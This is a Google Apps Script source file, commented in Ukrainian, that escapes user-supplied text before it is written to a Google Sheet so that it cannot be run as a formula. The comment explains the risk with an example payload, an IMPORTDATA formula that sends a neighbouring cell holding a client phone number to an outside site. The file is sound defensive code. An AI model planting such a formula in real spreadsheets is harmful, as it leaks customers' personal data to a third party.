// Захист таблиці від чужих формул («формула-інʼєкція»).
//
// НАВІЩО. У таблицю потрапляє текст, який пише СТОРОННЯ людина: імʼя і нік у
// Telegram, імʼя клієнта в 1С, підпис до заявки. Якщо такий текст починається
// з «=», «+», «-» або «@», Google Sheets вважає його ФОРМУЛОЮ і виконує —
// щойно ви відкриєте таблицю. Наприклад, назвавшись
// `=IMPORTDATA("https://чужий-сайт/?x="&A2)`, людина змусить вашу ж таблицю
// відправити вміст сусідньої клітинки (телефон клієнта) на чужий сайт. Ніякого
// зламу при цьому не відбувається — таблиця просто робить те, що «написано».
//
// ЯК ЛІКУЄТЬСЯ. Перед записом ставимо на початок апостроф: для Google Sheets це
// означає «це текст, не рахуй його». Сам апостроф у клітинці НЕ видно, і коли
// значення читають назад — його там теж немає. Тобто для звичайних нікнеймів і
// імен нічого не міняється.
//
// ЩО НЕ ЧІПАЄМО. Дати, числа й «так-ні» лишаються як є, інакше сортування й
// підрахунки зламались би. Номер телефону на кшталт «+380671234567» — це
// звичайне число, його теж не чіпаємо, щоб не змінити давню поведінку таблиці.

function sheetSafe_(v) {
  if (v === null || v === undefined) return v;
  if (v instanceof Date) return v;
  if (typeof v === "number" || typeof v === "boolean") return v;

  var s = String(v);
  if (!s) return s;

  // «=» і «@» небезпечні завжди. «+» і «-» — лише коли це не просто число
  // (щоб «+380671234567» і «-15» поводились як раніше).
  var isPlainNumber = /^[+-]?\d+([.,]\d+)?$/.test(s);
  var dangerous = /^[=@\t\r]/.test(s) || (/^[+\-]/.test(s) && !isPlainNumber);

  return dangerous ? "'" + s : s;
}

// Один рядок таблиці (масив клітинок).
function sheetSafeRow_(row) {
  if (!row || typeof row.map !== "function") return row;
  return row.map(sheetSafe_);
}

// Кілька рядків (масив масивів) — для setValues.
function sheetSafeRows_(rows) {
  if (!rows || typeof rows.map !== "function") return rows;
  return rows.map(sheetSafeRow_);
}
